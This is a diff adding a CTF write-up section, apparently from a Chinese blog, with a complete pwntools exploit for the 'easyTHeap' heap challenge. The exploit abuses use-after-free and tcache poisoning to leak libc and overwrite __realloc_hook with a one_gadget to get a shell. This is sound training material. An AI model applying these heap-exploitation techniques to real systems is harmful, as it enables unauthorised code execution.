@@ -596,3 +596,81 @@ payload = b'\x90'*(0x6c+4) + p32(e.sym['win']) + p32(e.sym['main']) + p32(0xdead
 p.sendlineafter(b'Please enter your string:', payload)
 p.interactive()
 ```
+
+### [V&N2020 公开赛]easyTHeap
+
+有UAF风险，而且限制了malloc和free的调用次数。本地的glibc版本带了[double free检测]({{ site.url }}/blog/glibc-malloc/#14%E7%89%88%E6%9C%AC%E7%9A%84double-free%E6%A3%80%E6%B5%8B)，和远程靶机的版本不同，得自己[编译一个]({{ site.url }}/blog/ubuntu-packages/#%E7%BC%96%E8%AF%91%E5%85%B6%E4%BB%96%E7%89%88%E6%9C%AC%E7%9A%84-glibc)
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './vn_pwn_easyTHeap'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 28164)
+# libc = ELF('/home/ubuntu/glibc-2.27/lib/libc.so.6')
+libc = ELF('/home/ubuntu/glibc-lib/buuoj-ubuntu-18-glibc-2.27.so')
+
+
+def Add(size):
+    p.sendlineafter(b'choice: ', b'1')
+    p.sendlineafter(b'size?', bytes(f'{size}', encoding='utf8'))
+
+
+def Edit(index, content):
+    p.sendlineafter(b'choice: ', b'2')
+    p.sendlineafter(b'idx?', bytes(f'{index}', encoding='utf8'))
+    p.sendlineafter(b'content:', content)
+
+
+def Show(index):
+    p.sendlineafter(b'choice: ', b'3')
+    p.sendlineafter(b'idx?', bytes(f'{index}', encoding='utf8'))
+
+
+def Delete(index):
+    p.sendlineafter(b'choice: ', b'4')
+    p.sendlineafter(b'idx?', bytes(f'{index}', encoding='utf8'))
+
+
+def Exit():
+    p.sendlineafter(b'choice: ', b'5')
+
+
+Add(0x80)  # 0
+Add(0x20)  # 1
+Delete(0)
+Delete(0)
+Show(0)
+tcache_chunk_addr = u64(p.recv(6).ljust(8, b'\x00'))
+tcache_count_addr = tcache_chunk_addr - 0x250  # size of tcache_perthread_struct
+log.success(f'tcache chunk: {hex(tcache_chunk_addr)}, count: {hex(tcache_count_addr)}')
+Add(0x80)  # 2, 0
+Edit(2, p64(tcache_count_addr))
+Add(0x80)  # 3, 2, 0
+Add(0x80)  # 4, 申请到tcache->counts处的内存
+Edit(4, b'\x08' * 64)  # 修改所有tcache bins的长度
+
+Delete(2)
+Show(0)
+arena_top_addr = u64(p.recv(6).ljust(8, b'\x00'))
+# offset = 0x60
+offset = 88
+realloc_hook_addr = arena_top_addr - offset - 0x20
+libc_base_addr = realloc_hook_addr - libc.sym['__realloc_hook']
+log.success(f'top={hex(arena_top_addr)}, realloc hook={hex(realloc_hook_addr)}, libc base={hex(libc_base_addr)}')
+# gadgets = [0x3f9ed, 0xd6872, 0xd6877]
+gadgets = [0x4f322, 0x10a38c, 0x4f2c5]
+gadget = gadgets[1]+ libc_base_addr
+log.success(f'gadget={hex(gadget)}')
+realloc = libc_base_addr + libc.sym['__libc_realloc']
+log.success(f'realloc={hex(realloc)}')
+
+Edit(4, b'\x08' * 64 + p64(realloc_hook_addr))  # 因为tcache->counts紧邻tcache->entries，所以修改tcache bin使得分配特定的内存，而且没有检查
+Add(24)  # 5
+
+Edit(5, p64(gadget) + p64(realloc+4))
+Add(100)
+
+p.interactive()
+```
